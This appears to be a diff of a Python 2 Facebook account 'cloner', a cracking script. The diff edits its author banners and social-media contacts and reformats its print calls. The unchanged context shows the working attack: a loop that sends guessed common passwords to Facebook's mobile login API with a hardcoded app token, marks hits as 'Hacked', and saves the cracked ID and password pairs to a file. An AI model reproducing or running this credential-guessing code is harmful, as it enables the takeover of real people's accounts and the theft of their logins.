@@ -112,7 +112,7 @@ print  """
 \033[0;95m╭════════════════════════════════════════════╮
 \033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Zalim Cloner"                                
 \033[0;91m║\033[0;91m Team :\033[0;92m "FLY Team"                                                  
-\033[0;91m║ \033[0;93m:\033[0;91m                                        
+\033[0;91m║ \033[0;93mCredit: \033[0;92m"BlackMafia"                                                    
 \033[0;95m╰════════════════════════════════════════════╯
              
                 
@@ -135,10 +135,11 @@ logo1 = """
 
 \033[1;96m---------------------Zalim💜Cloner---------------------
                 
+
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;92mAUTHOR : \033[0;92mZalim Cloner.                                
-\033[0;91m║\033[0;91mFB ACC :\033[0;92m "cute.sadia.malik"                                                  
-\033[0;91m║ \033[0;93mWhtsap:\033[0;91m+92310bs                                        
+\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Zalim Cloner"                                
+\033[0;91m║\033[0;91m Team :\033[0;92m "FLY Team"                                                  
+\033[0;91m║ \033[0;93mCredit: \033[0;92m"BlackMafia"                                                    
 \033[0;95m╰════════════════════════════════════════════╯
              
                 
@@ -166,22 +167,18 @@ logo2 = """
 
 \033[1;96m---------------------Zalim💜Cloner---------------------
                 
+
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;92mAUTHOR : \033[0;92mZalim Cloner.                                
-\033[0;91m║\033[0;91mFB ACC :\033[0;92m "cute.sadia.malik"                                                  
-\033[0;91m║ \033[0;93mWhtsap:\033[0;91m+92310bs                                        
+\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Zalim Cloner"                                
+\033[0;91m║\033[0;91m Team :\033[0;92m "FLY Team"                                                  
+\033[0;91m║ \033[0;93mCredit: \033[0;92m"BlackMafia"                                                    
 \033[0;95m╰════════════════════════════════════════════╯
              
                 
-
-
-\033[1;95mFAST Pakistani cloning comands”¹
-
-\033[1;91m Command Edit By Zalim
-
-                                                
-\033[1;96m-----------------Zalim💜Cloner--------------------------
+\033[1;96m-----------------Zalim💜Cloner----------------------
 """
+             
+                
 CorrectUsername = "zalim"
 CorrectPassword = "hacker"
 
@@ -281,7 +278,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-            jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password' +username)
+                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass1                                    
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
@@ -289,7 +286,7 @@ def action():
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
@@ -300,7 +297,7 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                     jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                        print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)   
                         print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
@@ -308,7 +305,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                             jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                            print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                             print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
@@ -319,7 +316,7 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                               jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
@@ -327,7 +324,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
@@ -338,7 +335,7 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                        print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                         print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
@@ -346,7 +343,7 @@ def action():
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                           jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                            print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                             print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
@@ -357,7 +354,7 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                 jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass6
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass6+'\n')
@@ -365,7 +362,7 @@ def action():
                                                 oks.append(c+user+pass6)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                      jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass6 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass6+'\n')
@@ -377,7 +374,7 @@ else:
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass7
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass7+'\n')
@@ -385,7 +382,7 @@ else:
                                                 oks.append(c+user+pass7)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                     jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass7 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass7+'\n')
@@ -393,12 +390,12 @@ else:
                                                     cpb.append(c+user+pass7)                                                                                                                                                                                                                
                                                                                                                                                                                                                 
                                                                                                                                                                                                             
-      else:
+                                         else:
                                             pass8="919191"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                            jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass8
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass8+'\n')
@@ -406,19 +403,19 @@ else:
                                                 oks.append(c+user+pass8)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass8 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass8+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass8)                                                                                                                                                                                                      
                                                                                                                                                                                                             
-      else:
+                                         else:
                                             pass9="@@@111"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                 print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user + '  |  ' + pass9
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass9+'\n')
@@ -426,7 +423,7 @@ else:
                                                 oks.append(c+user+pass9)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                  jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
+                                                    print(' Hacked-By-Zalim  |   User-ID    |   + password'+username)
                                                     print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass9 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass9+'\n')
@@ -462,8 +459,7 @@ else:
 
 
 \033[1;96mThanks me later
-\033[1;95mFb\033[1;97mksaif113
-\033[1;95myoutube\033[1;97mhttps://w ww.facebook.com/cute.sadia.malik"""
+\033[1;95mFb\033[1;97mhttps://w ww.facebook.com/ayanjutt2014"""
 
     
     raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
